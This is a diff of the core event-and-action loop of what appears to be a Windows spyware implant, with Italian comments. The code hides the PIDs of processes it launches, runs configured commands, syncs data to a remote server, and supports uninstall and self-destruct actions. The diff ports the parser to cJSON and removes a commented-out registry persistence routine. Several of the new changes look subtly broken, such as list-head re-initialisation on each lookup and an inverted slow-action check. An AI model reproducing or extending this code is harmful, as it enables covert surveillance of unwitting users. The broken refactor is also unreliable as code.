@@ -1,14 +1,17 @@
+#include <mutex>
 #include <windows.h>
+#include <rcs/list.h>
+#include <cJSON/cJSON.h>
 #include "common.h"
+#include "bss.h"
 #include "H4-DLL.h"
 #include "demo_functions.h"
 #include "UnHookClass.h"
 #include "DeepFreeze.h"
 #include "x64.h"
-#include "status_log.h"
 #include "SM_Core.h"
 #include "SM_ActionFunctions.h"
-#include "JSON\JSON.h"
+#include "process.h"
 #include "SM_EventHandlers.h"
 
 // Il sistema si basa su condizioni->eventi->azioni
@@ -22,26 +25,26 @@
 #define MAX_DISPATCH_FUNCTION 15 // Massimo numero di azioni registrabili
 #define SYNCM_SLEEPTIME 100
 
-typedef void (WINAPI *EventMonitorAdd_t) (JSONObject, event_param_struct *, DWORD);
+typedef void (WINAPI *EventMonitorAdd_t) (cJSON*, EVENT_PARAM *, DWORD);
 typedef void (WINAPI *EventMonitorStart_t) (void);
 typedef void (WINAPI *EventMonitorStop_t) (void);
 typedef BOOL (WINAPI *ActionFunc_t) (BYTE *);
 
 ActionFunc_t ActionFuncGet(DWORD action_type, BOOL *is_fast_action);
 
-typedef void (WINAPI *conf_callback_t)(JSONObject, DWORD counter);
-extern BOOL HM_ParseConfSection(char *conf, WCHAR *section, conf_callback_t call_back);
-extern BOOL HM_CountConfSection(char *conf, WCHAR *section, DWORD *count);
-extern DWORD AM_GetAgentTag(const WCHAR *agent_name);
+typedef void (WINAPI *conf_callback_t)(cJSON *, DWORD counter);
+extern BOOL HM_ParseConfSection(char *conf, const char *section, conf_callback_t call_back);
+extern BOOL HM_CountConfSection(char *conf, const char *section, DWORD *count);
+extern DWORD AM_GetAgentTag(const CHAR *agent_name);
 
 // Gestione event monitor  ----------------------------------------------
 
 typedef struct  {
-	WCHAR event_type[32];
+	CHAR event_type[32];
 	EventMonitorAdd_t pEventMonitorAdd;
 	EventMonitorStart_t pEventMonitorStart;
 	EventMonitorStop_t pEventMonitorStop;
-} event_monitor_elem;
+} EVENT_MONITOR;
 
 // Struttura per gestire i thread di ripetizione
 typedef struct {
@@ -50,24 +53,24 @@ typedef struct {
 	DWORD count; 
 	DWORD delay;
 	BOOL  semaphore;
-} repeated_event_struct;
+} REPEATED_EVENT;
 
 // Struttura della tabella degli eventi
 typedef struct {
 	BOOL event_enabled;
-	repeated_event_struct repeated_event;
+	REPEATED_EVENT repeated_event;
 	HANDLE repeated_thread;
-} event_table_struct;
+} EVENT_TABLE;
 
 // Tabella degli event monitor attualmente registrati
 DWORD event_monitor_count = 0;
-event_monitor_elem event_monitor_array[MAX_EVENT_MONITOR];
+EVENT_MONITOR event_monitor_array[MAX_EVENT_MONITOR];
 
 // Tabella contenente lo stato di attivazione di tutti gli eventi nel file di configurazione
-event_table_struct *event_table = NULL;
+EVENT_TABLE *event_table = NULL;
 DWORD event_count = 0;
 
-DWORD WINAPI RepeatThread(repeated_event_struct *repeated_event)
+DWORD WINAPI RepeatThread(REPEATED_EVENT *repeated_event)
 {
 	DWORD i = 0;
 	LOOP {
@@ -114,14 +117,14 @@ void StopRepeatThread(DWORD event_id)
 }
 
 // Registra un nuovo event monitor
-void EventMonitorRegister(WCHAR *event_type, EventMonitorAdd_t pEventMonitorAdd, 
+void EventMonitorRegister(CHAR *event_type, EventMonitorAdd_t pEventMonitorAdd, 
 						  EventMonitorStart_t pEventMonitorStart,
 						  EventMonitorStop_t pEventMonitorStop)
 {
 	if (event_monitor_count >= MAX_EVENT_MONITOR)
 		return;
 
-	swprintf_s(event_monitor_array[event_monitor_count].event_type, L"%s", event_type);
+	sprintf_s(event_monitor_array[event_monitor_count].event_type, "%s", event_type);
 	event_monitor_array[event_monitor_count].pEventMonitorAdd = pEventMonitorAdd;
 	event_monitor_array[event_monitor_count].pEventMonitorStop = pEventMonitorStop;
 	event_monitor_array[event_monitor_count].pEventMonitorStart = pEventMonitorStart;
@@ -154,30 +157,30 @@ void EventTableInit()
 // Setta lo stato iniziale di un evento
 void SM_EventTableState(DWORD event_id, BOOL state)
 {
-	event_table_struct *temp_event_table;
+	EVENT_TABLE *temp_event_table;
 	// Alloca la tabella per contenere quel dato evento 
 	// La tabella e' posizionale
 	if (event_id >= event_count) {
-		temp_event_table = (event_table_struct *)realloc(event_table, (event_id + 1) * sizeof(event_table_struct));
+		temp_event_table = (EVENT_TABLE *)realloc(event_table, (event_id + 1) * sizeof(EVENT_TABLE));
 		if (!temp_event_table)
 			return;
 		event_table = temp_event_table;
 		event_count = event_id + 1;
 		event_table[event_id].repeated_thread = NULL;
-		ZeroMemory(&event_table[event_id].repeated_event, sizeof(repeated_event_struct));
+		ZeroMemory(&event_table[event_id].repeated_event, sizeof(REPEATED_EVENT));
 	}
 	event_table[event_id].event_enabled = state;
 }
 
 // Assegna una riga "evento" della configurazione al corretto event monitor
-void EventMonitorAddLine(const WCHAR *event_type, JSONObject conf_json, event_param_struct *event_param, DWORD event_id, BOOL event_state)
+void EventMonitorAddLine(const CHAR *event_type, cJSON* conf_json, EVENT_PARAM *event_param, DWORD event_id, BOOL event_state)
 {
 	DWORD i;
 	// Inizializza lo stato attivo/disattivo dell'evento
 	SM_EventTableState(event_id, event_state);
 
 	for (i=0; i<event_monitor_count; i++)
-		if (!wcsicmp(event_monitor_array[i].event_type, event_type)) {
+		if (!stricmp(event_monitor_array[i].event_type, event_type)) {
 			event_monitor_array[i].pEventMonitorAdd(conf_json, event_param, event_id);
 			break;
 		}
@@ -193,40 +196,87 @@ BOOL EventIsEnabled(DWORD event_id)
 }
 //------------------------------------------------------------------
 
-
-
-
 // Tabella delle actions ------------------------------------------
 
 typedef struct {
 	ActionFunc_t pActionFunc; // Puntatore alla funzione che effettua l'action
 	BYTE *param;              // Puntatore all'array contenente i parametri
-} action_elem;
+} ACTION_ELEM;
 
 typedef struct {
+	LIST_ENTRY entry;
+
 	DWORD subaction_count; // numero di azioni collegate all'evento 
-	action_elem *subaction_list; // puntatore all'array delle azioni 
+	ACTION_ELEM *subaction_list; // puntatore all'array delle azioni 
 	BOOL is_fast_action; // e' TRUE se non contiene alcuna sottoazione lenta (sync, uninst e execute)
 	BOOL triggered; // Se l'evento e' triggerato o meno
-} event_action_elem;
+} EVENT_ACTION_ELEM;
 
-static event_action_elem *event_action_array = NULL; // Puntatore all'array dinamico contenente le actions.
+static LIST_ENTRY event_action_array = {}; // Puntatore all'array dinamico contenente le actions.
                                                      // Si chiude con una entry nulla.
 static DWORD event_action_count = 0; // Numero di elementi nella tabella event/actions
+
+static EVENT_ACTION_ELEM* AllocateEventAction()
+{
+	void* ptr = malloc(sizeof(EVENT_ACTION_ELEM));
+	if (ptr != NULL) {
+		memset(ptr, 0, sizeof(EVENT_ACTION_ELEM));
+	}
+
+	return (EVENT_ACTION_ELEM*)ptr;
+}
+
+static EVENT_ACTION_ELEM* GetEventPosition(DWORD size)
+{
+	InitializeListHead(&event_action_array);
+
+	if (IsListEmpty(&event_action_array))
+		return NULL;
+
+	LIST_ENTRY* head = &event_action_array;
+
+	for (; size > 0; size--) {
+		if (head->Flink == &event_action_array)
+			return NULL;
+
+		head = head->Flink;
+	}
+
+	return (EVENT_ACTION_ELEM *)head->Flink;
+}
 
 // Funzione da esportare (per eventuali event monitor esterni o per far generare eventi anche 
 // agli agents). Triggera l'evento "index". L'event_id indica quale evento sta triggerando l'azione.
 // Se l'evento e' stato disabilitato, l'azione non e' triggerata
 void TriggerEvent(DWORD index, DWORD event_id)
 {
-	// Se e' uguale ad AF_NONE sara' sicuramente > event_action_count
-	if (index >= event_action_count)
-		return;
+	EVENT_ACTION_ELEM* entry = GetEventPosition(index);
+	if (entry != NULL) {
+		if (EventIsEnabled(event_id))
+			entry->triggered = TRUE;
+	}
+}
 
-	// L'azione viene effettivamente triggerata solo se l'evento che l'ha generata
-	// e' attivo in quel momento
-	if (EventIsEnabled(event_id))
-		event_action_array[index].triggered = TRUE;
+static BOOL ReadEvent(DWORD* base, DWORD* event_id, BOOL action_type)
+{
+	EVENT_ACTION_ELEM* entry = NULL;
+	do {
+		entry = GetEventPosition(*base);
+
+		if (entry != NULL) {
+			if (entry->triggered && entry->is_fast_action == action_type) {
+				entry->triggered = FALSE;
+				*event_id = *base;
+				*base = *base + 1;
+				return TRUE;
+			}
+		}
+
+		*base = *base + 1;
+	} while (entry != NULL);
+
+	*base = 0;
+	return FALSE;
 }
 
 // Cerca un evento qualsiasi che e' stato triggerato. Se lo trova torna TRUE e valorizza
@@ -236,37 +286,14 @@ BOOL ReadEventSlow(DWORD *event_id)
 {
 	static DWORD i = 0;
 
-	for (; i<event_action_count; i++) 
-		if (event_action_array[i].triggered && !event_action_array[i].is_fast_action) {
-			event_action_array[i].triggered = FALSE;
-			*event_id = i;
-			// Evita che lo stesso evento possa 
-			// essere triggerato continuamente	
-			i++; 
-			return TRUE;
-		}
-
-	i = 0;
-	return FALSE;
+	return ReadEvent(&i, event_id, FALSE);
 }
 
 // Legge solo azioni veloci
 BOOL ReadEventFast(DWORD *event_id)
 {
 	static DWORD i = 0;
-
-	for (; i<event_action_count; i++) 
-		if (event_action_array[i].triggered && event_action_array[i].is_fast_action) {
-			event_action_array[i].triggered = FALSE;
-			*event_id = i;
-			// Evita che lo stesso evento possa 
-			// essere triggerato continuamente	
-			i++; 
-			return TRUE;
-		}
-
-	i = 0;
-	return FALSE;
+	return ReadEvent(&i, event_id, TRUE);
 }
 
 // Esegue le actions indicate
@@ -274,11 +301,17 @@ void DispatchEvent(DWORD event_id)
 {
 	DWORD i;
 
+	// Se l'evento non esiste nella event_action table ritorna
+	EVENT_ACTION_ELEM* entry = GetEventPosition(event_id);
+
+	if (entry == NULL)
+		return;
+
 	// Se l'action torna TRUE (es: nuova configurazione), smette di eseguire
 	// sottoazioni che potrebbero non esistere piu'
-	for (i=0; i<event_action_array[event_id].subaction_count; i++) {
-		if (event_action_array[event_id].subaction_list[i].pActionFunc) {
-			if (event_action_array[event_id].subaction_list[i].pActionFunc(event_action_array[event_id].subaction_list[i].param))
+	for (i=0; i<entry->subaction_count; i++) {
+		if (entry->subaction_list[i].pActionFunc) {
+			if (entry->subaction_list[i].pActionFunc(entry->subaction_list[i].param))
 				break;
 		}
 	}
@@ -289,34 +322,49 @@ void DispatchEvent(DWORD event_id)
 // Torna FALSE solo se ha inserito con successo una azione slow
 BOOL ActionTableAddSubAction(DWORD event_number, DWORD subaction_type, BYTE *param)
 {
-	void *temp_action_list;
 	BOOL is_fast_action;
 	DWORD subaction_count;
 
 	// Se l'evento non esiste nella event_action table ritorna
-	if (event_number >= event_action_count)
+	EVENT_ACTION_ELEM* entry = GetEventPosition(event_number);
+
+	if (entry == NULL)
 		return TRUE;
 
 	// All'inizio subaction_list e subaction_count sono a 0 perche' azzerate nella ActionTableInit
 	// XXX si, c'e' un int overflow se ci sono 2^32 sotto azioni che potrebbe portare a un exploit nello heap (es: double free)....
-	temp_action_list = realloc(event_action_array[event_number].subaction_list, sizeof(action_elem) * (event_action_array[event_number].subaction_count + 1) );
+	void *dst = realloc(entry->subaction_list, sizeof(ACTION_ELEM) * (entry->subaction_count + 1) );
 
 	// Se non riesce ad aggiungere la nuova sottoazione lascia tutto com'e'
-	if (!temp_action_list)
+	if (!dst)
 		return TRUE;
 
 	// Se l'array delle sottoazioni e' stato ampliato con successo, incrementa il numero delle sottoazioni
 	// e aggiunge la nuova subaction
-	subaction_count = event_action_array[event_number].subaction_count++;
-	event_action_array[event_number].subaction_list = (action_elem *)temp_action_list;
-	event_action_array[event_number].subaction_list[subaction_count].pActionFunc = ActionFuncGet(subaction_type, &is_fast_action);
+	subaction_count = entry->subaction_count++;
+	entry->subaction_list = (ACTION_ELEM *)dst;
+	entry->subaction_list[subaction_count].pActionFunc = ActionFuncGet(subaction_type, &is_fast_action);
 
-	event_action_array[event_number].subaction_list[subaction_count].param = param;
+	entry->subaction_list[subaction_count].param = param;
 
 	return is_fast_action;
 }
 
 
+static void DeleteListAction()
+{
+	while (IsListEmpty(&event_action_array) == FALSE) {
+		EVENT_ACTION_ELEM *entry = GetEventPosition(0);
+		if (entry != NULL) {
+			for (DWORD j = 0; j < entry->subaction_count; j++)
+				SAFE_FREE(entry->subaction_list[j].param);
+
+			SAFE_FREE(entry->subaction_list);
+			RemoveEntryList(&entry->entry);
+			free(entry);	// deallocate memory!
+		}
+	}
+}
 
 // Quando questa funzione viene chiamata non ci devono essere thread attivi 
 // che possono chiamare la funizone TriggerEvent. Dovrei proteggerlo come CriticalSection
@@ -325,51 +373,35 @@ BOOL ActionTableAddSubAction(DWORD event_number, DWORD subaction_type, BYTE *par
 void ActionTableInit(DWORD number)
 {
 	DWORD i,j;
-	event_action_elem *temp_event_action_array = NULL;
+	EVENT_ACTION_ELEM *temp_event_action_array = NULL;
+		
+	DeleteListAction();
 
-	// Libera gli eventuali parametri allocati nella precedente configurazione
-	for (i=0; i<event_action_count; i++) {
-		for (j=0; j<event_action_array[i].subaction_count; j++)
-			SAFE_FREE(event_action_array[i].subaction_list[j].param);
+	event_action_count = 0;
 
-		SAFE_FREE(event_action_array[i].subaction_list);
-	}
-
-	// Alloca una nuova tabella
-	if (number)
-		temp_event_action_array = (event_action_elem *)realloc(event_action_array, number * sizeof(event_action_elem));
-
-	if (temp_event_action_array) {
-		event_action_count = number;
-		event_action_array = temp_event_action_array;
-		ZERO(event_action_array, number * sizeof(event_action_elem));
-		for (i=0; i<event_action_count; i++) 
-			event_action_array[i].is_fast_action = TRUE; // all'inizio conta tutte come fast actions
-	} else {
-		event_action_count = 0;
-		SAFE_FREE(event_action_array);
-		return;
+	for (DWORD n = 0; n < number; n++) {
+		EVENT_ACTION_ELEM *entry = AllocateEventAction();
+		if (entry != NULL) {
+			entry->is_fast_action = TRUE;
+			InsertTailList(&event_action_array, &entry->entry);
+			event_action_count++;
+		}
 	}
 }
 
 //----------------------------------------------------------------
-
-
-
-
-
 
 // Gestione delle action function registrate -----------------------------------------------------------
 typedef struct {
 	DWORD action_type;
 	ActionFunc_t pActionFunc;
 	BOOL is_fast_action;
-} dispatch_func_elem;
+} DISPATCH_FUNC;
 
 
 // Tabella delle azioni di default
 DWORD dispatch_func_count = 0;
-dispatch_func_elem dispatch_func_array[MAX_DISPATCH_FUNCTION];
+DISPATCH_FUNC dispatch_func_array[MAX_DISPATCH_FUNCTION];
 
 
 // Registra un'action
@@ -404,55 +436,79 @@ ActionFunc_t ActionFuncGet(DWORD action_type, BOOL *is_fast_action)
 }
 
 //-----------------------------------------------------------------------------------
-void WINAPI ParseEvents(JSONObject conf_json, DWORD counter)
+void WINAPI ParseEvents(cJSON *conf_json, DWORD counter)
 {
-	event_param_struct event_param;
+	EVENT_PARAM event_param;
 
-	if (conf_json[L"start"])
-		event_param.start_action = conf_json[L"start"]->AsNumber();
+	if (cJSON_GetObjectItem(conf_json, "start"))
+		event_param.start_action = cJSON_GetNumberValue(cJSON_GetObjectItem(conf_json, "start"));
 	else
 		event_param.start_action = AF_NONE;
 
-	if (conf_json[L"end"])
-		event_param.stop_action = conf_json[L"end"]->AsNumber();
+	if (cJSON_GetObjectItem(conf_json, "end"))
+		event_param.stop_action = cJSON_GetNumberValue(cJSON_GetObjectItem(conf_json, "end"));
 	else
 		event_param.stop_action = AF_NONE;
 
-	if (conf_json[L"repeat"])
-		event_param.repeat_action = conf_json[L"repeat"]->AsNumber();
+	if (cJSON_GetObjectItem(conf_json, "repeat"))
+		event_param.repeat_action = cJSON_GetNumberValue(cJSON_GetObjectItem(conf_json, "repeat"));
 	else
 		event_param.repeat_action = AF_NONE;
 
-	if (conf_json[L"iter"])
-		event_param.count = conf_json[L"iter"]->AsNumber();
+	if (cJSON_GetObjectItem(conf_json, "iter"))
+		event_param.count = cJSON_GetNumberValue(cJSON_GetObjectItem(conf_json, "iter"));
 	else
 		event_param.count = 0xFFFFFFFF;
 
-	if (conf_json[L"delay"]) {
-		event_param.delay = (conf_json[L"delay"]->AsNumber() * 1000);
+	if (cJSON_GetObjectItem(conf_json, "delay")) {
+		event_param.delay = cJSON_GetNumberValue(cJSON_GetObjectItem(conf_json, "delay")) * 1000;
 		if (event_param.delay == 0)
 			event_param.delay = 1;
 	} else
 		event_param.delay = 1;
 
-	EventMonitorAddLine(conf_json[L"event"]->AsString().c_str(), conf_json, &event_param, counter, conf_json[L"enabled"]->AsBool());
+	EventMonitorAddLine(
+		cJSON_GetStringValue(cJSON_GetObjectItem(conf_json, "event")), 
+		conf_json, &event_param, counter, cJSON_IsTrue(cJSON_GetObjectItem(conf_json, "enabled")));
 }
 
-BYTE *ParseActionParameter(JSONObject conf_json, DWORD *tag)
+static wchar_t* wstrFromCfg(cJSON* root, const char* key)
 {
-	WCHAR action[64];
+	if (cJSON_GetObjectItem(root, key) == NULL)
+		return NULL;
+
+	cJSON* node = cJSON_GetObjectItem(root, key);
+
+	size_t len = strlen(cJSON_GetStringValue(node));
+	if (len > 0)
+		len++;
+
+	if (!len)
+		return NULL;
+
+	wchar_t* dst = (wchar_t*)malloc(len * 2);
+	if (!dst)
+		return NULL;
+
+	swprintf_s(dst, len, L"%S", cJSON_GetStringValue(node));
+
+	return dst;
+}
+BYTE *ParseActionParameter(cJSON* conf_json, DWORD *tag)
+{
+	char action[64];
 	BYTE *param = NULL;
 	
 	if (tag)
 		*tag = AF_NONE;
 
-	_snwprintf_s(action, 64, _TRUNCATE, L"%s", conf_json[L"action"]->AsString().c_str());		
+	_snprintf(action, 64, "%s", cJSON_GetStringValue(cJSON_GetObjectItem(conf_json, "action")));		
 
-	if (!wcscmp(action, L"log")) {
+	if (!strcmp(action, "log")) {
 		*tag = AF_LOGINFO;
-		param = (BYTE *)wcsdup(conf_json[L"text"]->AsString().c_str());
+		param = (BYTE *)wstrFromCfg(conf_json, "text");
 
-	} else if (!wcscmp(action, L"synchronize")) {
+	} else if (!strcmp(action, "synchronize")) {
 		typedef struct {
 			DWORD min_sleep;
 			DWORD max_sleep;
@@ -462,77 +518,80 @@ BYTE *ParseActionParameter(JSONObject conf_json, DWORD *tag)
 		} sync_conf_struct;
 		sync_conf_struct *sync_conf;
 		*tag = AF_SYNCRONIZE;
-		param = (BYTE *)malloc(sizeof(sync_conf_struct) + wcslen(conf_json[L"host"]->AsString().c_str())*2);
+		param = (BYTE *)malloc(sizeof(sync_conf_struct) + strlen(cJSON_GetStringValue(cJSON_GetObjectItem(conf_json, "host"))));
 		if (param) {
 			sync_conf = (sync_conf_struct *)param;
-			sync_conf->min_sleep = conf_json[L"mindelay"]->AsNumber();
-			sync_conf->max_sleep = conf_json[L"maxdelay"]->AsNumber();
-			sync_conf->band_limit= conf_json[L"bandwidth"]->AsNumber();
-			sync_conf->exit_after_completion = conf_json[L"stop"]->AsBool();
-			sprintf(sync_conf->asp_server, "%S", conf_json[L"host"]->AsString().c_str());
+			sync_conf->min_sleep = cJSON_GetNumberValue(cJSON_GetObjectItem(conf_json, "mindelay"));
+			sync_conf->max_sleep = cJSON_GetNumberValue(cJSON_GetObjectItem(conf_json, "maxdelay"));
+			sync_conf->band_limit= cJSON_GetNumberValue(cJSON_GetObjectItem(conf_json, "bandwidth"));
+			sync_conf->exit_after_completion = cJSON_IsTrue(cJSON_GetObjectItem(conf_json, "stop"));
+			sprintf(sync_conf->asp_server, "%s", cJSON_GetStringValue(cJSON_GetObjectItem(conf_json, "host")));
 		}
 
-	} else if (!wcscmp(action, L"execute")) {
+	} else if (!strcmp(action, "execute")) {
 		*tag = AF_EXECUTE;
-		DWORD len = wcslen(conf_json[L"command"]->AsString().c_str());
+		DWORD len = strlen(cJSON_GetStringValue(cJSON_GetObjectItem(conf_json, "command")));
 		param = (BYTE *)malloc(len+1);
-		sprintf((char *)param, "%S", conf_json[L"command"]->AsString().c_str());
-	} else if (!wcscmp(action, L"uninstall")) {
+		sprintf((char *)param, "%s", cJSON_GetStringValue(cJSON_GetObjectItem(conf_json, "command")));
+	} else if (!strcmp(action, "uninstall")) {
 		*tag = AF_UNINSTALL;
 
-	} else if (!wcscmp(action, L"module")) {
-		if (!wcscmp(conf_json[L"status"]->AsString().c_str(), L"start"))
+	} else if (!strcmp(action, "module")) {
+		if (!strcmp(cJSON_GetStringValue(cJSON_GetObjectItem(conf_json, "status")), "start"))
 			*tag = AF_STARTAGENT;
 		else
 			*tag = AF_STOPAGENT;
 		param = (BYTE *)malloc(sizeof(DWORD));
 		if (param) {
-			DWORD agent_tag = AM_GetAgentTag(conf_json[L"module"]->AsString().c_str());
+			DWORD agent_tag = AM_GetAgentTag(cJSON_GetStringValue(cJSON_GetObjectItem(conf_json, "module")));
 			memcpy(param, &agent_tag, sizeof(DWORD));
 		}
 
-	} else if (!wcscmp(action, L"event")) {
-		if (!wcscmp(conf_json[L"status"]->AsString().c_str(), L"enable"))
+	} else if (!strcmp(action, "event")) {
+		if (!strcmp(cJSON_GetStringValue(cJSON_GetObjectItem(conf_json, "status")), "enable"))
 			*tag = AF_STARTEVENT;
 		else
 			*tag = AF_STOPEVENT;
 		param = (BYTE *)malloc(sizeof(DWORD));
 		if (param) {
-			DWORD event_id = conf_json[L"event"]->AsNumber();
+			DWORD event_id = cJSON_GetNumberValue(cJSON_GetObjectItem(conf_json, "event"));
 			memcpy(param, &event_id, sizeof(DWORD));
 		}
-	} else if (!wcscmp(action, L"destroy")) {
+	} else if (!strcmp(action, "destroy")) {
 		*tag = AF_DESTROY;
 		param = (BYTE *)malloc(sizeof(BOOL));
 		if (param) {
-			BOOL isPermanent = conf_json[L"permanent"]->AsBool();
+			BOOL isPermanent = cJSON_IsTrue(cJSON_GetObjectItem(conf_json, "permanent"));
 			memcpy(param, &isPermanent, sizeof(BOOL));
 		}
 	}
 	return param;
 }
 
-void WINAPI ParseActions(JSONObject conf_json, DWORD counter)
+void WINAPI ParseActions(cJSON* conf_json, DWORD counter)
 {
-	JSONArray subaction_array;
+	cJSON* subaction_array = cJSON_GetObjectItem(conf_json, "subactions");
 	DWORD i;
 	DWORD tag;
 	BYTE *conf_ptr;
 
-	if (!conf_json[L"subactions"])
-		return;
-	subaction_array = conf_json[L"subactions"]->AsArray();
+	if (cJSON_IsArray(subaction_array)) {
+		cJSON* subaction = NULL;
+		i = 0;
 
-	for (i=0; i<subaction_array.size(); i++) {
-		JSONObject subaction;
-		if (!subaction_array[i]->IsObject())
-			continue;
-		subaction = subaction_array[i]->AsObject();
-		conf_ptr = ParseActionParameter(subaction, &tag);
-		// Se ha aggiunto una subaction "slow" marca tutta l'action come slow
-		// Basta una subaction slow per marcare tutto l'action
-		if (!ActionTableAddSubAction(counter, tag, conf_ptr)) 
-			event_action_array[counter].is_fast_action = FALSE;
+		cJSON_ArrayForEach(subaction, subaction_array) {
+			if (cJSON_IsObject(subaction) == false)
+				continue;
+
+			conf_ptr = ParseActionParameter(subaction, &tag);
+			// Se ha aggiunto una subaction "slow" marca tutta l'action come slow
+			// Basta una subaction slow per marcare tutto l'action
+			if (ActionTableAddSubAction(counter, tag, conf_ptr)) {
+				EVENT_ACTION_ELEM* entry = GetEventPosition(counter);
+				if (entry != NULL)
+					entry->is_fast_action = FALSE;
+			}
+		}
 	}
 }
 
@@ -542,17 +601,17 @@ void UpdateEventConf()
 {
 	DWORD action_count;
 	char *conf_memory;
-	if (!(conf_memory = HM_ReadClearConf(H4_CONF_FILE)))
+	if (!(conf_memory = HM_ReadClearConf(shared.H4_CONF_FILE)))
 		return;
 
 	// Legge gli eventi
 	EventTableInit();
-	HM_ParseConfSection(conf_memory, L"events", &ParseEvents);
+	HM_ParseConfSection(conf_memory, "events", &ParseEvents);
 
 	// Legge le azioni
-	HM_CountConfSection(conf_memory, L"actions", &action_count);
+	HM_CountConfSection(conf_memory, "actions", &action_count);
 	ActionTableInit(action_count);
-	HM_ParseConfSection(conf_memory, L"actions", &ParseActions);
+	HM_ParseConfSection(conf_memory, "actions", &ParseActions);
 
 	SAFE_FREE(conf_memory);
 }
@@ -567,7 +626,7 @@ void SM_HandleExecutedProcess()
 {
 	DWORD i;
 	char *proc_name;
-	pid_hide_struct pid_hide = NULL_PID_HIDE_STRUCT;
+	PID_HIDE pid_hide = NULL_PID_HIDE_STRUCT;
 
 	// Questa funzione viene richiamata prima che possa essere 
 	// eseguita SM_AddExecutedProcess: quindi e' questa che si 
@@ -597,8 +656,7 @@ void SM_HandleExecutedProcess()
 // Ne effettua anche l'hiding
 void SM_AddExecutedProcess(DWORD pid)
 {
-	DWORD i;
-	pid_hide_struct pid_hide = NULL_PID_HIDE_STRUCT;
+	PID_HIDE pid_hide = NULL_PID_HIDE_STRUCT;
 
 	// Aggiorna la lista dei PID eseguiti (se e' allocata)
 	if (!process_executed)
@@ -609,7 +667,7 @@ void SM_AddExecutedProcess(DWORD pid)
 	AM_AddHide(HIDE_PID, &pid_hide);
 
 	// Cerca un posto libero e inserisce il PID
-	for (i=0; i<MAX_PROCESS_EXECUTED; i++)
+	for (DWORD i=0; i<MAX_PROCESS_EXECUTED; i++)
 		if (!process_executed[i]) {
 			process_executed[i] = pid;
 			break;
@@ -631,25 +689,6 @@ DWORD WINAPI FastActionsThread(DWORD dummy)
 	return 0;
 }
 
-/*
-#define EVERY_N_CYCLES(x) static DWORD i=0; i++; if (i%x == 0)
-void RegistryWatchdog()
-{
-	static char key_value[DLLNAMELEN*3] = "";
-	DWORD key_size;
-	HKEY hOpen;
-
-	if (FNC(RegOpenKeyA)(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hOpen) != ERROR_SUCCESS)
-		return;
-
-	key_size = sizeof(key_value) - 1;
-	if (RegQueryValueEx(hOpen, REGISTRY_KEY_NAME, NULL, NULL, (unsigned char *)key_value, &key_size) == ERROR_FILE_NOT_FOUND) {
-		if (key_value[0] != 0) // Verifica che abbia un valore memorizzato per la stringa
-			FNC(RegSetValueExA)(hOpen, REGISTRY_KEY_NAME, NULL, REG_EXPAND_SZ, (unsigned char *)key_value, strlen(key_value)+1);
-	} 
-
-	FNC(RegCloseKey)(hOpen);
-}*/
 
 // Ciclo principale di monitoring degli eventi. E' praticamente il ciclo principale di tutto il client core.
 void SM_MonitorEvents(DWORD dummy)
@@ -657,19 +696,17 @@ void SM_MonitorEvents(DWORD dummy)
 	DWORD event_id;
 	DWORD dummy2;
 
-	InitializeCriticalSection(&action_critic_sec);
-
 	// Registrazione degli EM e delle AF. 
-	EventMonitorRegister(L"timer", EM_TimerAdd, EM_TimerStart, EM_TimerStop);
-	EventMonitorRegister(L"afterinst", EM_TimerAdd, NULL, NULL);
-	EventMonitorRegister(L"date", EM_TimerAdd, NULL, NULL);
-	EventMonitorRegister(L"process", EM_MonProcAdd, EM_MonProcStart, EM_MonProcStop);
-	EventMonitorRegister(L"connection", EM_MonConnAdd, EM_MonConnStart, EM_MonConnStop);
-	EventMonitorRegister(L"screensaver", EM_ScreenSaverAdd, EM_ScreenSaverStart, EM_ScreenSaverStop);	
-	EventMonitorRegister(L"winevent", EM_MonEventAdd, EM_MonEventStart, EM_MonEventStop);	
-	EventMonitorRegister(L"quota", EM_QuotaAdd, EM_QuotaStart, EM_QuotaStop);	
-	EventMonitorRegister(L"window", EM_NewWindowAdd, EM_NewWindowStart, EM_NewWindowStop);
-	EventMonitorRegister(L"idle", EM_UserIdlesAdd, EM_UserIdlesStart, EM_UserIdlesStop);
+	EventMonitorRegister("timer", EM_TimerAdd, EM_TimerStart, EM_TimerStop);
+	EventMonitorRegister("afterinst", EM_TimerAdd, NULL, NULL);
+	EventMonitorRegister("date", EM_TimerAdd, NULL, NULL);
+	EventMonitorRegister("process", EM_MonProcAdd, EM_MonProcStart, EM_MonProcStop);
+	EventMonitorRegister("connection", EM_MonConnAdd, EM_MonConnStart, EM_MonConnStop);
+	EventMonitorRegister("screensaver", EM_ScreenSaverAdd, EM_ScreenSaverStart, EM_ScreenSaverStop);	
+	EventMonitorRegister("winevent", EM_MonEventAdd, EM_MonEventStart, EM_MonEventStop);	
+	EventMonitorRegister("quota", EM_QuotaAdd, EM_QuotaStart, EM_QuotaStop);	
+	EventMonitorRegister("window", EM_NewWindowAdd, EM_NewWindowStart, EM_NewWindowStop);
+	EventMonitorRegister("idle", EM_UserIdlesAdd, EM_UserIdlesStart, EM_UserIdlesStop);
 
 	ActionFuncRegister(AF_SYNCRONIZE, DA_Syncronize, FALSE);
 	ActionFuncRegister(AF_STARTAGENT, DA_StartAgent, TRUE);
